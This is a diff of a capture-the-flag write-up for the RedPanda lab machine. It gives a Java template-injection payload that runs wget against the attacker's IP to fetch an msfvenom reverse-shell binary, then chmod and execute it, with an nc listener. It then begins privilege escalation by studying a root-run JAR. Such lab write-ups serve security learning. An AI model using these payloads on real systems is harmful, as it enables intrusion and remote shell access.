@@ -59,15 +59,15 @@ Hint: The payload won't work, unless we change the $ (dollar sign) to an * (aste
 Note: pentest.ws (Helps to create a reverse shell)
 The shell:<br>
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=[your-machine-ip] LPORT=1234 -f elf > rs.elf<br>
-Start your HTTP server in the same location as r.elf the reverse shell to the target machine: `python3 -m http.server 80`. Now the payload we'll use here is: `*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("")}`; as it is java based (collected from github). Now intercept the get request from searchbar and put the payload in the value section accordingly:<br>
+Start your HTTP server in the same location as r.elf the reverse shell to the target machine: python3 -m http.server 80. Now the payload we'll use here is: *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("")}; as it is java based (collected from github). Now intercept the get request from searchbar and put the payload in the value section accordingly:<br>
 To transfer the payload to the target machine:<br>
-`*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget [your-machine-ip]/rs.elf")}`<br>
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget [your-machine-ip]/rs.elf")}<br>
 To change the permission:<br>
-`*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./rs.elf")}`<br>
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./rs.elf")}<br>
 Now we execute but before that, do not forget to generate a listener:<br>
-`nc -lvnp 1234`<br>
-Execute: `*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./rs.elf")}`<br>
-Upgrading to the tty shell so that we can get a better view to follow: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+nc -lvnp 1234<br>
+Execute: *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./rs.elf")}<br>
+Upgrading to the tty shell so that we can get a better view to follow: python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ![image](https://user-images.githubusercontent.com/31168741/204106736-02c77520-4e37-43a1-89ce-8383d18f52fc.png)
 
@@ -77,6 +77,25 @@ In the server yay! Pass for user Woodenk is found under the directory:<br>
 
 ## System Own:
 <h3>Privilege Escalation</h3>
+We run pspy64(snoop unpriviledged Linux processes) to observe. We notice a JAR file is being executed by root within a time interval.<br>
+woodenk@redpanda:/home/woodenk$ cd /tmp<br>
+woodenk@redpanda:/tmp$ wget 10.10.16.9/pspy64 (Chnage the ip with your localhost)<br>
+woodenk@redpanda:/tmp$ chmod +x ./pspy64<br>
+woodenk@redpanda:/tmp$ ./pspy64<br>
+
+![image-25](https://user-images.githubusercontent.com/31168741/204232264-1a76f509-48c9-4f65-bdb2-23c479653fcd.png)
+
+We host an HTTP server at port 8000 in /opt/credit-score/LogParser/final/target/ and download the file. Opening the JAR file using jd-gui, it appears that /opt/panda_search/redpanda.log is being read in main().
+
+![image-26](https://user-images.githubusercontent.com/31168741/204232850-b2bd1377-acd0-4ff0-881f-7aa4fbcac886.png)
+
+According to the code, there are a few conditions to pass:<br>
+•	The line must contain “.jpg” in the string<br>
+•	split() will be done to the string where “||” is the delimiter.<br>
+•	The string must be split into 4 strings:<br>
+•	The first string must be a number.<br>
+•	4th string must be pointing to an existing .jpg file.<br>
+•	The .jpg file’s metadata tag “Artist” must have a value that matches to /credits/<author_name>_creds.xml.
 
 
 
